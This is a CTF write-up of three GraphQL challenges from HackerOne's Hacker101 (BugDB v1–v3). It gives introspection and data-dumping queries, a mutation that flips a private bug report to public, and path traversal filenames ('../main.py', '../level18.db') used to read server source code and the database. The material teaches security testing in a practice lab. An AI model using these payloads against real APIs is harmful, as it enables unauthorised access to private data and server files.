---
title: Hackerone BugDB challenge Writeup
author: Muhammad Adel
date: 2021-08-1 14:40:00 +0200
categories: [Hackerone CTF]
tags: [hackerone, graphql, ctf]
---

Peace be upon all of you, on this writeup I am going to cover the solutions of three challenges on Hacekrone related to GraphQL, they have three parts under the name BugDB v1/3. 

**Difficulty:** Easy and moderate


**Challenge Link:**  <https://ctf.hacker101.com/ctf>


## **BugDB v1**

### **Enumeration**
Once we will open the challenge we will found a graphql endpoint that has a graphiql interface that will ease the process of interacting with graphql.
![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfIt9g2F3m64Y2uQN65%2F1.png?alt=media&token=fea1f75e-6e93-4674-b197-9da01a09348f)

#### Reading Docs
when you stumble upon any graphql endpoint you need first to understand what is the graph schema? and what is the types of data that stored here. opening the documentation we will find mostly what we need.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfItiyVmbw-YWf_pMoR%2F2.png?alt=media&token=a6ec15ff-c1c0-4bfd-94f7-3c3f9dd3052f)

#### **Introspection Query**

> **Introspection** is the ability to query which resources are available in the current API schema. Given the API, via introspection, we can see the queries, types, fields, and directives it supports.

but we have another good solution which is to run the introspection query to retrieve all the structure of the graphql. an example for this is:


```graphql
 query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        locations
        args {
          ...InputValue
        }
      }
    }
  }
  fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
      name
      description
      args {
        ...InputValue
      }
      type {
        ...TypeRef
      }
      isDeprecated
      deprecationReason
    }
    inputFields {
      ...InputValue
    }
    interfaces {
      ...TypeRef
    }
    enumValues(includeDeprecated: true) {
      name
      description
      isDeprecated
      deprecationReason
    }
    possibleTypes {
      ...TypeRef
    }
  }
  fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
  }
  fragment TypeRef on __Type {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
      }
    }
  }
```

#### **GraphQL Voyager**

> With graphql-voyager you can visually explore your GraphQL API as an interactive graph. This is a great tool when designing or discussing your data model. It includes multiple example GraphQL schemas and also allows you to connect it to your own GraphQL endpoint. What are you waiting for, explore your API!

As long as graphql is very complex structure language so we need so form of visualization to display to us all schema and the relations between them.This awesome tool will help us to do this job. Simply you can open it website:

[https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)

what you need to pass for this tool is the output of the Introspection query. so enter the query at the graphql endpoint and copy the output to the voyager at change schema -> Introspection.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfIvxfLgRNo_e6PYqzo%2F3.png?alt=media&token=62f949fb-e06f-4751-8036-ce53903ca25a)

I think it's way more better than before. now we are ready to go through it.

### **Dumping data**
As you can see in the previous image there are three columns **(Bugs, Users, Bugs_)** and 6 types of queries that we can deal with them **(User, bug, findUser, findBug, allUsers, allBugs).**

#### **Getting Users**
We can start by trying to get some users. to know how to write the right query and argument that we need to pass. To know that we can click on user at the voyager.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfIxqn5WF01Du7bj5v-%2F4.png?alt=media&token=1a27ce91-088d-4323-b889-979e2cf4efd8)

let's craft our query. So there is a query called user that contains to columns (ID, username). so we can simply try the following query and see the output.


```graphql
query {
	user {
		edges {
		  node {
		    id
        username
        id
		  }
		}
  }
}
```
![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfIzAw5Df4umIu9rNIG%2F5.png?alt=media&token=d6f367bc-0f05-4f36-8bd7-966b25f2b48c)

Great now we know that there are two users admin and victim.

#### **Getting Bug Reports**
There also another interesting column that called Bugs.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfJ-rbd83nspihQprHo%2F6.png?alt=media&token=ac321c54-8364-4864-ae69-7effb7719a74)
We can see the fields that we can retrieve in the bug column. Also if we need to access the bug column as you can see in the image you have the ***allBugs and Bug*** query to access the Bugs Columns. Let's craft our payload as we did before.
```graphql
query {
	allBugs {
  edges {
    node {
      id
      id
      private
      reporter {
        id
      }
      reporterId
      
    }
  }
  }
}
```
![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfJ0WB2IC0GWl1ME730%2F7.png?alt=media&token=130fe6e4-a9bd-4e19-a364-0ade74fe5dbf)
Great! Now, it seems that we have dumped all content expect for the text filed in ***Bugs_** *column.

#### **Flag**
But How we can access the text filed?

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfJ1CGgIlpeWW3DgCMs%2F8.png?alt=media&token=eeac4a79-9993-4f8a-908c-7a6ba9a67936)
As you can see that the text filed is accessible through Users columns which is accessible by the user query. So our payload should look something like that:

```graphql
query {
  user {
    edges {
      node {
        id
        username
        bugs{
          edges {
            node {
              text
            }
          }
        }
      }
    }
  }
}

```
![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfIJQAMLPzYGB5yJrHh%2F-MfJ2UNpaV-zzy161Kgc%2F2021-07-23%2017_46_25-Hamza%20Namira%20-%20Ala%20Bab%20Allah.png?alt=media&token=e3781a0b-5bc7-4000-94af-40f2a714e4c6)

and Volia! we have solved the first one.


## **BugDB v2**

Now, let's move on to the next part of this series. on the previous one we begin to get familiar with the syntax and quires of the graphQL. On this on we are going to be familiar with the Mutation query.

### **Enumeration**
like the previous one we have to apply the introspection query to get familiar with the schema and the structure of the graphQL. and then pass it to the voyager tool.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJ4uMnp7WL5D4zeIFx%2F-MfJERNLEzp4fcO4dIwQ%2F1.png?alt=media&token=91266ae8-4112-4351-a2d6-7b3315c9855b)

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJ4uMnp7WL5D4zeIFx%2F-MfJEXCRedLsb8h3WXCa%2F2.png?alt=media&token=76fa2b2c-5ab8-4eb2-8bad-5b31c4c83008)

### **Dumping data**

let's dump the users and the bugs columns.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJ4uMnp7WL5D4zeIFx%2F-MfJF3Qddga0EUe2yiwA%2F3.png?alt=media&token=2579aea0-4fa2-4226-bb53-11cfdf930621)

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJ4uMnp7WL5D4zeIFx%2F-MfJF6CRc3McRtbj8TCP%2F4.png?alt=media&token=bb70f6f0-f941-4a8f-8d31-138bad9d6cdb)

So now we know that we have two users admin and victim and we have one report. but we didn't get the flag like before when we dumped the database. hmm! but here we have Mutations but what is it?

### **Mutations**

> Mutation queries modify data in the data store and returns a value. It can be used to insert, update, or delete data. Mutations are defined as a part of the schema.

you can read more information about from here:
[https://www.tutorialspoint.com/graphql/graphql_mutation.htm](https://www.tutorialspoint.com/graphql/graphql_mutation.htm)

So with mutation we can edit, insert or delete data. let's examine in the graphql what fields this query require.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJ4uMnp7WL5D4zeIFx%2F-MfJGjSU28uZ81p3lZDV%2F5.png?alt=media&token=5c2b177e-c197-43ca-939b-49dd62b4709e)

We have here ***modifyBug*** query that can edit the bug details. but here there is a very interesting field which is ***private***. this filed accept boolean value that will allow us to change the value of the report from private to public to be able to view. remember that we had 2 users and only one report so it is an indication that there is a hidden one. let's craft our mutation query:
```graphql
mutation{
  modifyBug(private:false, id:2){
    ok
    bug {
      id
      text
      reporterId
      private
    }
  }
}
```
‌
#### **Flag**
This query will change the visibility of the second payload from private to public. let's try to dump the bug columns again.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJ4uMnp7WL5D4zeIFx%2F-MfJIXGNwRdAq6eEX8OB%2F6.png?alt=media&token=200bac84-12ef-4159-84d8-57580bd45406)

and the flag is here!

‌
## **BugDB v3**

Moving to the last one which seem to be a bit difficult than the others. let's begin:

### **Enumeration**

Let's collect all the needed information as we did before:

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJnCVcv1mgkXDecBC0%2F1.png?alt=media&token=1a7d28cb-8aab-4d01-b4de-cf73b496e627)

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJnGJr9_UxcxihTdQ0%2F2.png?alt=media&token=62d07e31-ea00-43a2-ab84-1dcd5e0956b0)

### **Dumping Data**
It seems that there is a new columns here called ***attachments** *let's dump all:
```graphql
query {
  allUsers {
    edges{
      node{
        username
        id
      }
    }
    edges {
      node {
        id
        bugs{
          edges{
            node{
              attachments{
                edges{
                  node{
                    filename
                    id
                    bugId
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJnJC47uSMZ3ehgWjX%2F3.png?alt=media&token=71c2f5d8-22d1-4656-bb02-aca276b396ce)


### **Mutations**

We have here ***attachFile** *and ***modifyAttachment** *query that can upload the some attachments. let's test it by adding some stuff:
```graphql  
 mutation{
  attachFile(bugId: 2, contents: "ItsFadinG") {
    ok
  }
}
```

If we look again at the attachments file we will find that a new file has been added.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJp3uerKWqy-58DJsA%2F4.png?alt=media&token=020e6394-eb2e-4d1f-9393-30c961be67a8)

So we need to access this file but there is now intended function to be able to view this. we can take a look at some hints form Hackerone website it says:

1. What new functionality was added?

1.  Filenames are always interesting.

2.  How do you access attachments? Hint: not via GraphQL.

So, I think we can't access the attachment through GraphQL. so we can try to access it through the browser. I did some directory brute force and I found that there is a directory called Attachment/1.

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJqh92W_Oldl3Xp-nZ%2F5.png?alt=media&token=6dda79fd-9bde-42f3-bfb5-e9876fda95ad)

Great we can now access our uploaded file. the problem here that we didn't find the flag yet what else we need to do to find it?

### **Directory Traversal**

I struggled a lot at this point I couldn't find any way to find the flag. I though about getting a hint and this video helped me a lot:

Here Nahamsec struggles also at this point and he contacted someone at Hackerone discord server and he told him:

-   you can rename the attachments in way that match the name of a file that that exits in the app.

-   if you know daeken's CTF, he likes building python flask apps.

This seems interesting! here we may have directory traversal vulnerability. there is a common file in FLASK called `main.py` let's try to access it.
```graphql
mutation{
  modifyAttachment(id:1, filename:"../main.py"){
    ok
  } 
}
```
we will use the mutation `modifyAttachment` to edit the name of our file. and BOOM it works!

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJtCLEtFvkDNVt9n6L%2F6.png?alt=media&token=f8c1ffce-c29d-4fc1-8717-1530d42e72ec)

still we didn't find the flag but let's try to access another file.
```graphql
mutation{
  modifyAttachment(id:1, filename:"../model.py"){
    ok
  }  
}
```

![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJtlVaBbPyU2BP-LdB%2F7.png?alt=media&token=111abbf3-b26e-4f85-8d91-3007649dc658)


#### **Flag**
Here is another interesting file here called level18.db which seems to be the database.
```graphql
mutation{
  modifyAttachment(id:1, filename:"../level18.db"){
    ok
  }  
}
```
![](https://gblobscdn.gitbook.com/assets%2F-MeU8PSC8pJwv8a582oA%2F-MfJIh2UiuMv6GZ7xGwB%2F-MfJuiDtEy56NICuE_Xw%2F8.png?alt=media&token=950b4629-3a18-442a-a9ac-615c7fe9b024)

Bingo! The Flag is here! Thanks For reading I hope you enjoyed it.